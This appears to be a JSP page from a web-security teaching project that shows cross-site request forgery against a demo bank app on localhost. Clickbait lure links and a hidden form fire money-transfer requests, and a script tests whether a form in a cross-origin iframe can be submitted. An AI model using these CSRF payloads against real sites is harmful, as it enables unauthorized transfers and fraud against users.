<%
    response.setHeader("Pragma", "no-cache");
    response.setHeader("Cache-Control", "no-cache");
    response.setDateHeader("Expires", 0);
%>
<%@ page contentType="text/html;charset=UTF-8" %>

<html>
<head>
    <title>Video hosting (Fake page)</title>
</head>
<body>

<a href="http://localhost:8080/web-security-holes-01/csrf/bank-make-transfer-by-GET.jsp?amount=1000">I want to see cool girls!!! (<b>FAKE link</b>)</a>
<br/>
<a href="javascript:document.forms['transfer-many'].submit()">I want to see other cool girls!!! (<b>FAKE link</b>)</a>

<form name="transfer-many"
      method="post"
      action="http://localhost:8080/web-security-holes-01/csrf/bank-make-transfer-by-POST.jsp?amount=220" >
    <input type="hidden" name="amount" value="250">
    <input type="hidden" name="something-other" value="123">
</form>


<script>
    function tryCallFormInIframe() {
        const iframe = document.getElementById("iframe1")
        const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;

        console.log("iframe: " + iframe)
        console.log("iframe1: " + iframeDocument)

        let form = iframeDocument.forms["transfer-many"];
        form.elements["amount"].value = 951
        form.submit()
    }
</script>

<%-- You can use iframe content which belongs to you site. --%>
<%--<iframe id="iframe1" src="http://localhost:8080/web-security-holes-01/csrf/bank-make-transfer-form.jsp"></iframe>--%>

<%-- You CANNOT use iframe content which belongs to ANOTHER site. --%>
<iframe id="iframe1" src="http://temp-site-2:8080/web-security-holes-01/csrf/bank-make-transfer-form.jsp"></iframe>


<button onclick="tryCallFormInIframe()" >Try to call form of another site in iframe</button>

</body>
</html>
